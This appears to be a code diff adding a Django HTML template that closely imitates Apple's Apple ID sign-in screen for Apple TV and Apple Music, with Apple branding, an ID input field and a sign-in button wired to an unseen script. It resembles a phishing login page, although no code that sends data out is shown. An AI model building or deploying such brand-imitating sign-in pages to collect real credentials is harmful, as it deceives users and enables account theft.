@@ -1,0 +1,34 @@
+{% load static %}
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title>Sign in</title>
+    <link rel="stylesheet" href="css.css"/>
+    <link href='https://fonts.googleapis.com/css?family=Inter' rel='stylesheet'>
+    <link href='https://fonts.googleapis.com/css2?family=Manrope' rel='stylesheet'/>
+    <link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/a/ab/Apple-logo.png">
+</head>
+
+<body>
+    <div class="header inter sub-header">
+        <img src="data:image/png;base64,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" width="160px" height="130px" style="margin-left: 2%; margin-top: 6%;"/>
+        <p style="font-size: 30px; font-weight: bold; color: white; text-align: center; margin-top: 18%; margin-left: -16%;">Sign in with your Apple ID</p>
+        <p style="font-size: 20px; color: white; text-align: center; margin-top: 21%; margin-left: -29%;">You will be signed into Apple Tv and Apple Music.</p>
+        <table style="margin-top: 26%; margin-left: -32.2%;" cellsapcing="10" cellspacing="20">
+                <div class="inter">
+                <tr>
+                    <td><input style="font-size: 20px; background-color: #484444; border-radius: 6px; padding-left: 14px; border-color: white; color: white; height: 50px; width: 400px; margin-right: 8px;" type="text" placeholder="Apple ID" id="loginid"/> <button style="height: 55px; width: 100px; font-size: 22px; color: white; background-color: #0982eb; border-radius: 5px; border-color: #0982eb; text-align: center;" onclick="signin()">OK</button></td>
+                </tr>
+                <tr>
+                    <td><a href="Terms.html" style="color: #0982eb; text-align: center; margin-top: 10%; margin-left: 20%; text-decoration: none;">Create New Apple ID &gt;</a></td>
+                </tr>
+                <tr>
+                    <td><a href="https://iforgot.apple.com/password/verify/appleid" style="color: #0982eb; text-align: center; margin-top: 10%; margin-left: 14%; text-decoration: none;">Forgot Apple Id or Password?</a></td>
+                </tr>
+                </div>
+        </table>
+    </div>
+    <script src="first_page.js" type="text/javascript"></script>
+</body>
